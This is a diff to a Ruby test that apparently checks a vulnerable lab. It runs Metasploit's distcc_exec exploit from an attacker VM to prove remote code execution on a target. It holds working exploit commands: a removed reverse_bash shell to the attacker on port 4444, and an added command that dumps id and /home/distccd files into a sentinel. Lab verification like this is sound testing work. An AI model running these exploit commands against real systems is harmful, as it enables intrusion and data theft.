@@ -62,47 +62,48 @@ class DistCCExecTest < PostProvisionTest
     nonce = "#{Time.now.to_i}_#{rand(100000)}"
     sentinel = "/tmp/distcc_pwned_#{nonce}"
 
-    # One-shot msfconsole run on the attacker. reverse_bash payload, backgrounded
-    # session, then run a command on the session: prove exec (id), tag the host,
-    # drop the sentinel on the target, and try to read the leaked flag.
+    # One-shot msfconsole run on the attacker. We use the no-session command
+    # payload cmd/unix/generic: distcc_exec runs our CMD on the target via the
+    # compiler trick, so there is no reverse/bind shell to race — the proof is
+    # the sentinel file the command leaves on the target, which we then confirm
+    # over the target's own guest agent. The command also records id/hostname
+    # and the leaked flag into the sentinel as evidence.
+    #
+    # HOME must be exported: the guest agent runs commands with no HOME, and
+    # msfconsole's rb-readline aborts on startup without it.
+    payload_cmd = "id > #{sentinel}; uname -n >> #{sentinel}; " \
+                  "cat /home/distccd/* >> #{sentinel} 2>/dev/null; chmod 644 #{sentinel}"
     msf = <<~MSF.gsub("\n", ' ')
+      export HOME=/root TERM=dumb;
       msfconsole -q -x "
       use #{MSF_MODULE};
       set RHOSTS #{target_ip};
       set RPORT #{self.port};
-      set LHOST #{attacker_ip};
-      set LPORT 4444;
-      set PAYLOAD cmd/unix/reverse_bash;
-      set ExitOnSession false;
-      exploit -z -j;
-      sleep 25;
-      sessions -l;
-      sessions -C 'echo DISTCC_RCE_OK; id; uname -n; touch #{sentinel}; cat /home/distccd/* 2>/dev/null';
-      sleep 5;
+      set PAYLOAD cmd/unix/generic;
+      set CMD '#{payload_cmd}';
+      run;
+      sleep 8;
       exit -y
       "
     MSF
 
     result = run_on_system(ATTACKER, msf, timeout: 600)
-    out = "#{result[:stdout]}\n#{result[:stderr]}"
-    add_evidence('msf_output', "echo #{Shellwords.escape(out[-4000..-1] || out)}")
+    msf_out = "#{result[:stdout]}\n#{result[:stderr]}"
+    add_evidence('msf_output', "echo #{Shellwords.escape(msf_out[-4000..-1] || msf_out)}")
 
-    rce_marker = out.include?('DISTCC_RCE_OK') && out =~ /uid=\d+/
+    # Proof of RCE: the sentinel the exploit's command left on the target.
+    sentinel_read = run_vagrant_ssh("cat #{sentinel} 2>/dev/null", timeout: 30)
+    sentinel_body = sentinel_read[:stdout].to_s
+    add_evidence('sentinel_on_target', "echo #{Shellwords.escape(sentinel_body)}") unless sentinel_body.empty?
 
-    # Independent confirmation: did the exploit create the sentinel on the target?
-    sentinel_check = run_vagrant_ssh("test -e #{sentinel} && echo SENTINEL_PRESENT", timeout: 30)
-    sentinel_present = sentinel_check[:stdout].include?('SENTINEL_PRESENT')
-
-    if sentinel_present
-      detail = "RCE confirmed: msf distcc_exec from #{ATTACKER} (#{attacker_ip}) created #{sentinel} on the target (#{target_ip})."
-      detail += ' (session command output also seen)' if rce_marker
-      pass_check(name, detail, tier: 3)
-    elsif rce_marker
-      # Session ran a command but the sentinel wasn't found on the target — still
-      # proves exec, but flag it as partial so a human looks.
-      pass_check(name, "RCE confirmed via msf session output (uid= seen) from #{ATTACKER}, though sentinel #{sentinel} was not found on the target.", tier: 3)
+    if sentinel_body =~ /uid=\d+/
+      pass_check(name,
+                 "RCE confirmed: #{MSF_MODULE} from #{ATTACKER} (#{attacker_ip}) ran a command on the target (#{target_ip}); sentinel #{sentinel} contains #{sentinel_body[/uid=\S+/]}.",
+                 tier: 3)
     else
-      fail_check(name, "Exploit did not confirm RCE: no sentinel on target and no session command output. See msf_output evidence.", tier: 3)
+      fail_check(name,
+                 "Exploit did not confirm RCE: sentinel #{sentinel} absent or empty on the target. See msf_output evidence.",
+                 tier: 3)
     end
   end
 end
